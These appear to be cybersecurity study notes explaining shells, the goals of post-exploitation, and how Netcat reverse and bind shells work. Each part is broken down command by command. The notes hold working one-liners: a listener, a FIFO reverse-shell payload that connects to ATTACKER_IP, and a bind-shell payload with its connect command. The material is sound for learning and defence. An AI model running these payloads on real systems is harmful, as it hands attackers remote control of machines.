### **What is a Shell?**

A **shell** is software that lets a user interact with an operating system. Usually a **command-line interface (CLI)** (e.g., Bash), though it can be graphical. In cybersecurity, a shell refers to an **attacker’s command session** on a compromised system.
### **Why Shell Access Matters**

Once an attacker gets a shell, they can:

- **Remote System Control** → Run commands and programs on the target
- **Privilege Escalation** → Upgrade from low-privileged to admin/root access
- **Data Exfiltration** → Locate, read, and steal sensitive data
- **Persistence** → Create users, backdoors, or scheduled access
- **Post-Exploitation** → Deploy malware, hide activity, remove evidence
- **Pivoting** → Use the compromised system to attack other network hosts

---
# **Reverse Shells (Netcat) 

**Reverse shell:** Target system initiates a connection back to the attacker, giving remote shell access.

**Listener setup (attacker):**

```
  nc -lvnp 443
``` 

- `-l`: listen
- `-v`: verbose
- `-n`: no DNS
- `-p`: port
- Common ports (53, 80, 443, etc.) help blend with normal traffic.

**Reverse shell payload (example – pipe/FIFO):**

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

- `rm -f /tmp/f` → Removes any existing pipe to avoid conflicts
- `mkfifo /tmp/f` → Creates a named pipe (FIFO) for two-way communication
- `cat /tmp/f` → Reads commands sent through the pipe
- `| sh -i 2>&1` → Executes commands in an interactive shell and sends errors + output
- `| nc ATTACKER_IP ATTACKER_PORT` → Sends shell I/O to attacker via Netcat
- `>/tmp/f` → Sends attacker input back into the pipe

---
# Bind Shell

As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

- **Bind shell:** Target opens (binds) a port and listens; attacker connects to it to get a shell.
- **Use case:** When the target **cannot make outbound connections**.
- **Downside:** Easier to detect since it listens on an open port.

This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.

**Bind Shell Payload (run on target):**

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

 `rm -f /tmp/f` → Removes existing pipe
`mkfifo /tmp/f` → Creates FIFO for two-way communication

`cat /tmp/f` → Reads attacker input
    
- `| bash -i 2>&1` → Interactive shell with error/output redirection
    
- `| nc -l 0.0.0.0 8080` → Netcat listens on all interfaces, port 8080
    
- `>/tmp/f` → Sends output back into the pipe
    

> Ports **<1024 require root**, so 8080 avoids privilege issues.

---

**Attacker connects:**

`nc -nv TARGET_IP 8080`

- `-n` → No DNS
    
- `-v` → Verbose
    
- Connects to the listening bind shell
    

**Result:**  
Attacker gets an interactive shell on the target system.